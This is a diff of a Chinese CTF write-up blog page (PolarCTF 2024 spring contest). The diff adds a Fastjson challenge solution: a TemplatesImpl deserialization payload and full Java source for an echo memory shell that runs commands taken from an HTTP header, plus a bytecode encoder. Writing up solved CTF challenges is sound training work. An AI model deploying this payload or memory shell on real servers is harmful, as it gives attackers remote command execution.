@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      PolarCTF2024春季个人挑战赛wp | Infernity&#39;s Blog
+      PolarCTF2024春季个人挑战赛全wp | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「PolarCTF2024春季个人挑战赛wp」
+			「PolarCTF2024春季个人挑战赛全wp」
 		
 	</p>
 
@@ -247,7 +247,7 @@
 		<div class="article-title">
 			
 	<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
-		PolarCTF2024春季个人挑战赛wp
+		PolarCTF2024春季个人挑战赛全wp
 	</a>
 
 		</div>
@@ -265,7 +265,7 @@
 
 	<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" itemprop="url">
 		<time datetime="2024-04-30T11:41:04.000Z" itemprop="dateUpdated">
-	  		2024-06-18
+	  		2024-12-03
 	  </time>
 	</a> 
 
@@ -286,7 +286,7 @@
 			
 
 	
-    <span class="leancloud_visitors" id="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_visitors" data-url="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024春季个人挑战赛wp">
+    <span class="leancloud_visitors" id="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_visitors" data-url="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024春季个人挑战赛全wp">
        	<i class="icon-eye"></i>
        	热度
         
@@ -298,7 +298,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_likes" data-url="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024春季个人挑战赛wp" rel="unlike">
+    <span class="leancloud_likes" id="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/_likes" data-url="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" data-title="PolarCTF2024春季个人挑战赛全wp" rel="unlike">
         <i class="icon-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -440,7 +440,19 @@
 <p>运行poc之后的cookie全部打进去，然后利用http头CMD来执行命令：</p>
 <p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20240527202415287.png" alt="image-20240527202415287"></p>
 <p>flag{d50d0c23-262d-4a16-1046-e55b27ff8f6b}</p>
-<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p>好好好，Fastjson，待我稍作思量。</p>
+<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203161337576.png" alt="image-20241203161337576"></p>
+<p>注意到<code>JSON.parseObject</code>同时设置了<code>SupportNonPublicField</code>支持非公共属性，所以可使用<code>TemplatesImpl</code>加载恶意字节码的形式回显利用。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;: [&quot;恶意类字节码&quot;],&#x27;_name&#x27;: &#x27;a.b&#x27;,&#x27;_tfactory&#x27;: &#123;&#125;,&quot;_outputProperties&quot;: &#123;&#125;,&quot;_name&quot;: &quot;b&quot;,&quot;_version&quot;: &quot;1.0&quot;,&quot;allowedProtocols&quot;: &quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>shell.class：这里用回显内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Memshell.fastjson1_nei_chun_ma;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            org.springframework.web.context.request.<span class="type">RequestAttributes</span> <span class="variable">requestAttributes</span> <span class="operator">=</span> org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletRequest</span> <span class="variable">httprequest</span> <span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();</span><br><span class="line">            javax.servlet.http.<span class="type">HttpServletResponse</span> <span class="variable">httpresponse</span> <span class="operator">=</span> ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();</span><br><span class="line">            String[] cmd =  <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httprequest.getHeader(<span class="string">&quot;Infernity&quot;</span>)&#125;;  <span class="comment">//请求头加一个Infernity后面加命令</span></span><br><span class="line">            <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd).start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next().getBytes();</span><br><span class="line">            httpresponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(result));</span><br><span class="line">            httpresponse.getWriter().flush();</span><br><span class="line">            httpresponse.getWriter().close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">            TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> FiletoBase(<span class="string">&quot;C:\\Users\\13664\\Documents\\JavaUtils\\target\\classes\\com\\Memshell\\fastjson1_nei_chun_ma\\shell.class&quot;</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">FiletoBase</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(filename));</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="keyword">return</span> encode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后把生成的恶意类字节码替换进payload就可以。</p>
+<p><img src="/img/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/image-20241203161828436.png" alt="image-20241203161828436"></p>
 	
 		</div>
 		
@@ -459,7 +471,7 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp" rel="prev">
+			<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp" rel="prev">
 				&laquo;上一篇
 			</a>
 		
@@ -482,6 +494,29 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
+								SUCTF 2025 WEB部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 14日, 2025				
+							</p>
+							<p class="relate-post-content">
+								SU_photogallery
+尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -682,8 +717,8 @@ flag没有权...
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
-								PolarCTF2024夏季个人挑战赛wp			
+							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
+								PolarCTF2024夏季个人挑战赛全wp			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
@@ -703,35 +738,9 @@ flag{72077a55w312584wb1aaa88888cd...
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
+							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">
-								第九届中国海洋大学信息安全竞赛web题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 26日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezPHPparse_str()可以进行变量覆盖。
-全部流量包：
-
-菜狗工具#1python继承链攻击。
-1print(().__class__.__base__.__subclasses__()[132].__init__.__gl...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第九届中国海洋大学信息安全竞赛web题解/blue-whale_logo.png" alt="第九届中国海洋大学信息安全竞赛web题解"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
 							</a>
 						</div>
 					</li>												
@@ -1022,7 +1031,7 @@ flag{72077a55w312584wb1aaa88888cd...
 	<div class="copyright">
 		<p>
 			 
-				&copy;2024, content by Infernity. All Rights Reserved.
+				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
 			
 			
 				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
